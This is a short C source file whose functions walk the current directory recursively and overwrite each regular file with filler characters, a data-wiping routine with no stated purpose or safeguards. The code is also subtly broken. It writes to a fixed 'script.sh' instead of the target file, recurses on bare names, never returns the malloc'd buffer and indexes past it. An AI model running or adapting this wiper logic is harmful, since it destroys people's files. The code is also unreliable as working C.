#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include "overwrite.h"

#define PRINTABLE_ASCII_CHARACTERS_AMOUNT 94

int overwiteCurrentDir() {
  return overwriteDirectory(".");
}

//returns the amount of bytes written
int overwriteDirectory(char* dirPath) {
  DIR *d;
  struct dirent *dir;
  int bytesWritten = 0;

  d = opendir(dirPath);

  if(d) {
    while ((dir = readdir(d)) != NULL) {
      char* name = dir->d_name;
      printf("%s\n", name);
      if(strcmp(name, ".") && strcmp(name, "..")) {
        if(isRegularFile(name)) {
          int written = overwriteFile(name);
          if(written > 0)
            bytesWritten += written;
        }
        else
          bytesWritten += overwriteDirectory(name);
      }
    }
    closedir(d);
  }

  return bytesWritten;
}

int isRegularFile(const char *path) {
    struct stat path_stat;
    stat(path, &path_stat);
    return S_ISREG(path_stat.st_mode);
}

//returns the amount of bytes written, -1 if the file couldn't be opened
int overwriteFile(char* filePath) {
  FILE *fp;
  long fileSize = findSize(filePath);
  char* overrideStr;
  asciiCharacters(overrideStr);

  if(fileSize == -1)
    return -1;

  fp = fopen("script.sh", "w+");
  int written = fwrite(overrideStr, 1, fileSize, fp);

  fclose(fp);
  return written;
}

long int findSize(char* fileName) {
    FILE* fp = fopen(fileName, "r");

    if (fp == NULL)
        return -1;

    fseek(fp, 0L, SEEK_END);
    long int res = ftell(fp);
    fclose(fp);

    return res;
}

void asciiCharacters(char* str) {
  str = malloc(PRINTABLE_ASCII_CHARACTERS_AMOUNT);

  for (int i = 32; i < sizeof(str); i++)
    str[i] = i;
}
